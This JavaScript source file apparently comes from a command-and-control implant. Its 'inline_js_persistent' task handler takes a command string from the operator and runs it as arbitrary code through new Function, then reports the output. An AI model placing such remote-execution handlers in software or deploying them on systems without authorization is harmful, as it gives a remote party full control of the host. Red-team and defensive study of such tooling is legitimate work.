exports.aux_inline_js_persistent = function(task, command, params,completed){
    try{
        let command_params = JSON.parse(params);
        if(!command_params.hasOwnProperty('command')){return {"user_output": "Missing command", "completed": true, "status": "error"}}
        var expression = command_params['command'];
        var contents = new Function(expression)();
        if(contents === ""){
            return {"user_output": "No output from command", "completed": completed};
        }
        else if(contents === true){
            return {"user_output": "True", "completed": completed};
        }
        else if(contents === false){
            return{"user_output": "False", "completed": completed};
        }
        else if(contents === undefined){
            return {"user_output": "Empty Response", "completed": completed};
        }
        return {"user_output": contents.toString(), "completed": completed};
    }
    catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
    }
};

exports.inline_js_persistent  = function(task, command, params,completed){
    return {"user_output": "", "status": "mid", "completed": true};
};